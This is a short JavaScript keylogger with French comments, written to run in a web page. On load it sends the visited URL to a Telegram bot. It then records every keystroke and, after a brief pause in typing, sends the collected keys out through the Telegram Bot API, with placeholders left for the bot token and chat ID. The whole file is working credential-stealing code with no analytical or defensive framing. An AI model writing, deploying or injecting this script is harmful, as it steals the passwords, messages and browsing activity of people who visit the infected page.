var keys = '';
var current = document.URL;
var botToken = 'Your_Bot_Token';
var chatId = 'your_chat_id';
var typingTimer;  // Timer pour détecter la fin de la saisie
var doneTypingInterval = 500;  // Temps en ms (1 seconde)

// Fonction pour envoyer un message à Telegram
function sendToTelegram(message) {
    var xhr = new XMLHttpRequest();
    var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    xhr.open("POST", url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    var data = JSON.stringify({
        chat_id: chatId,
        text: message
    });
    xhr.send(data);
}

// Envoyer l'URL actuelle au démarrage
sendToTelegram("URL visited: " + current);

document.onkeydown = function (e) {
    clearTimeout(typingTimer);
    var key = e.key;
    keys += key;

    // Redémarrer le timer à chaque frappe
    typingTimer = setTimeout(doneTyping, doneTypingInterval);
}

function doneTyping() {
    if (keys != "") {
        sendToTelegram("Keys logged: " + keys);
        keys = "";
    }
}